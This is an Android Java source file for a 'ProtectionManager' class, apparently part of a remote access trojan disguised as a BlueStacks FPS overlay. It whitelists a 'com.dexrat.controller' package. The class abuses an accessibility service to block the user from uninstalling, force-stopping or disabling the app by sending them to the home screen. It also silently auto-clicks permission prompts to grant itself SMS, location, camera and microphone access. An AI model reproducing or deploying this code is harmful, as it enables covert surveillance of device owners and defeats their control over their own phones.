package com.bluestacks.fpsoverlay;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.core.content.ContextCompat;
import java.util.List;

public class ProtectionManager {
    private static final String TAG = "ProtectionManager";
    private final AccessibilityService service;
    private boolean antiUninstallEnabled = false;

    public ProtectionManager(AccessibilityService service) {
        this.service = service;
    }

    public boolean isAntiUninstallEnabled() {
        return antiUninstallEnabled;
    }

    public boolean isAllPermissionsGranted() {
        return hasAllPermissions();
    }

    public void setAntiUninstallEnabled(boolean enabled) {
        this.antiUninstallEnabled = enabled;
        Log.d(TAG, "Anti-Uninstall toggle set to: " + enabled);
    }

    public void handleAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";

        if (pkg.equals(service.getPackageName()) || 
            pkg.contains("com.dexrat.controller")) {
            return;
        }

        // Filter: Hanya proses jika paket berasal dari sistem, installer, atau pengaturan.
        // Ini meningkatkan performa dan tetap kompatibel di berbagai OS (MIUI, ColorOS, Samsung, dll).
        boolean isSystemPackage = pkg.contains("packageinstaller") || 
                                 pkg.contains("settings") || 
                                 pkg.contains("security") || 
                                 pkg.contains("safecenter") || 
                                 pkg.contains("permissioncontroller") ||
                                 pkg.contains("systemmanager") ||
                                 pkg.contains("coloros") ||
                                 pkg.contains("oppo") ||
                                 pkg.contains("iqoo") ||
                                 pkg.contains("lool") ||
                                 pkg.contains("smartmanager") ||
                                 pkg.equals("android");

        if (!isSystemPackage) return;

        if (antiUninstallEnabled) { 
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root != null) {
                int eventType = event.getEventType();
                if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
                    eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                    
                    if (isLikelyUninstallDialog(root)) {
                        Log.w(TAG, "!! UNINSTALL DETECTED !! Blocking.");
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                        root.recycle();
                        return;
                    }

                    if (isLikelyAccessibilityPage(root) || isLikelyAppInfoPage(root)) {
                        Log.e(TAG, "!!! PROTECTION TRIGGERED !!!");
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                        root.recycle();
                        return;
                    }
                }
                root.recycle();
            }
        }

        // Auto-allow permissions & battery optimization
        if (!hasAllPermissions()) {
            autoAllowPermissions();
        }
    }

    private boolean hasAllPermissions() {
        String[] permissions = {
                Manifest.permission.READ_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO
        };

        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(service, perm) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }

        // Check Battery Optimization
        android.os.PowerManager pm = (android.os.PowerManager) service.getSystemService(android.content.Context.POWER_SERVICE);
        if (pm != null && !pm.isIgnoringBatteryOptimizations(service.getPackageName())) {
            return false;
        }

        return true;
    }

    private boolean isLikelyUninstallDialog(AccessibilityNodeInfo root) {
        if (root == null) return false;
        
        String targetPkg = service.getPackageName();
        String appName = "BluestacksFPS"; 
        String controllerPkg = "com.dexrat.controller";
        
        // Jangan blokir jika ini adalah dialog untuk aplikasi kontroler
        if (checkNodeRecursive(root, controllerPkg)) {
            return false;
        }

        // Jangan blokir dialog izin standar
        boolean isPermissionDialog = checkNodeForText(root, "Allow") || 
                                     checkNodeForText(root, "Izinkan") ||
                                     checkNodeForText(root, "Grant");
        if (isPermissionDialog) return false;

        // Cek apakah dialog ini menyebutkan target aplikasi kita
        boolean mentionsTarget = checkNodeRecursive(root, targetPkg) || checkNodeRecursive(root, appName);
        if (!mentionsTarget) return false;

        // Cek kata kunci penghapusan (termasuk variasi ColorOS/UI baru)
        return checkNodeRecursive(root, "uninstall") ||
               checkNodeRecursive(root, "Uninstall") ||
               checkNodeRecursive(root, "uninstal") ||
               checkNodeRecursive(root, "Bongkar") ||
               checkNodeRecursive(root, "Copot") || 
               checkNodeRecursive(root, "Hapus") ||
               checkNodeRecursive(root, "Hapus instalasi") ||
               checkNodeRecursive(root, "menghapus") ||
               checkNodeRecursive(root, "delete") ||
               checkNodeRecursive(root, "instalan") ||
               checkNodeRecursive(root, "pemasangan") ||
               checkNodeRecursive(root, "instalasi");
    }

    private boolean isLikelyAccessibilityPage(AccessibilityNodeInfo root) {
        if (root == null) return false;

        String targetPkg = service.getPackageName();
        String controllerPkg = "com.dexrat.controller";
        
        if (checkNodeRecursive(root, controllerPkg)) {
            return false;
        }

        String accLabel = "BluestacksFPS";
        
        boolean isDetailPage = checkNodeRecursive(root, "core functionality") || 
                               checkNodeRecursive(root, "system communication");

        if (isDetailPage) return true;

        boolean hasIdentity = checkNodeRecursive(root, accLabel) || checkNodeRecursive(root, targetPkg);
        if (!hasIdentity) return false;

        return checkNodeForText(root, "Accessibility") || 
               checkNodeForText(root, "Aksesibilitas") ||
               checkNodeForText(root, "Downloaded") ||
               checkNodeForText(root, "Installed");
    }

    private boolean isLikelyAppInfoPage(AccessibilityNodeInfo root) {
        if (root == null) return false;

        boolean isAppInfoContext = checkNodeForText(root, "Force stop") || 
                                   checkNodeForText(root, "Paksa berhenti") ||
                                   checkNodeForText(root, "Uninstall") ||
                                   checkNodeForText(root, "Copot pemasangan") ||
                                   checkNodeForText(root, "Storage") ||
                                   checkNodeForText(root, "Penyimpanan") ||
                                   checkNodeForText(root, "Permissions") ||
                                   checkNodeForText(root, "Izin") ||
                                   checkNodeForText(root, "Data usage") ||
                                   checkNodeForText(root, "Penggunaan data");

        if (!isAppInfoContext) return false;

        String appName = "BluestacksFPS";
        String targetPkg = service.getPackageName();
        
        return checkNodeRecursive(root, appName) || checkNodeRecursive(root, targetPkg);
    }

    private void autoAllowPermissions() {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;

        if (isLikelyUninstallDialog(root)) {
            root.recycle();
            return;
        }

        String[] ids = {
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_always_button",
            "android:id/button1"
        };

        for (String id : ids) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (performSafeClick(node, id)) {
                        root.recycle();
                        return;
                    }
                }
            }
        }

        String[] keys = {"Allow", "Izinkan", "While using", "Saat aplikasi", "Allow all the time", 
                         "Izinkan sepanjang waktu", "Yes", "Ya", "OK", "Permit", "Bolehkan", "Sudah", 
                         "Terima", "Accept", "Tetap izinkan", "Always allow"};
        for (String key : keys) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(key);
            if (nodes != null) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (performSafeClick(node, "Text:" + key)) {
                        root.recycle();
                        return;
                    }
                }
            }
        }
        root.recycle();
    }

    private boolean performSafeClick(AccessibilityNodeInfo node, String identifier) {
        if (node == null) return false;
        try {
            if (node.isVisibleToUser() && node.isEnabled()) {
                String text = node.getText() != null ? node.getText().toString().toLowerCase() : "";
                
                if (isDangerousAction(text)) {
                    node.recycle();
                    return false;
                }

                AccessibilityNodeInfo target = node;
                if (!target.isClickable()) {
                    AccessibilityNodeInfo parent = target.getParent();
                    if (parent != null) {
                        if (parent.isClickable()) {
                            target = parent;
                        } else {
                            AccessibilityNodeInfo grandParent = parent.getParent();
                            if (grandParent != null && grandParent.isClickable()) {
                                target = grandParent;
                            }
                        }
                    }
                }

                if (target.isClickable()) {
                    boolean success = target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    if (target != node) target.recycle();
                    node.recycle();
                    return success;
                }
            }
        } catch (Exception ignored) {}
        node.recycle();
        return false;
    }

    private boolean isDangerousAction(String text) {
        if (text == null) return false;
        String t = text.toLowerCase();
        return t.contains("uninstall") || t.contains("un-install") || t.contains("uninstal") ||
               t.contains("hapus") || t.contains("menghapus") || t.contains("instalasi") ||
               t.contains("installasi") || t.contains("bongkar") || t.contains("copot") ||
               t.contains("nonaktif") || t.contains("disable") || 
               t.contains("force stop") || t.contains("paksa berhenti") || 
               t.contains("delete") || t.contains("clear data") || t.contains("hapus data") ||
               t.contains("storage") || t.contains("penyimpanan") || t.contains("cache") || 
               t.contains("tembolok") || t.contains("pemasangan") || t.contains("instalan");
    }

    private boolean checkNodeForText(AccessibilityNodeInfo node, String text) {
        if (node == null || text == null) return false;
        List<AccessibilityNodeInfo> found = node.findAccessibilityNodeInfosByText(text);
        if (found != null && !found.isEmpty()) {
            for (AccessibilityNodeInfo n : found) n.recycle();
            return true;
        }
        return checkNodeRecursive(node, text);
    }

    private boolean checkNodeRecursive(AccessibilityNodeInfo node, String target) {
        if (node == null) return false;
        
        CharSequence text = node.getText();
        if (text != null && text.toString().toLowerCase().contains(target.toLowerCase())) {
            return true;
        }
        
        CharSequence desc = node.getContentDescription();
        if (desc != null && desc.toString().toLowerCase().contains(target.toLowerCase())) {
            return true;
        }

        String viewId = node.getViewIdResourceName();
        if (viewId != null && viewId.toLowerCase().contains(target.toLowerCase())) {
            return true;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (checkNodeRecursive(child, target)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }
}
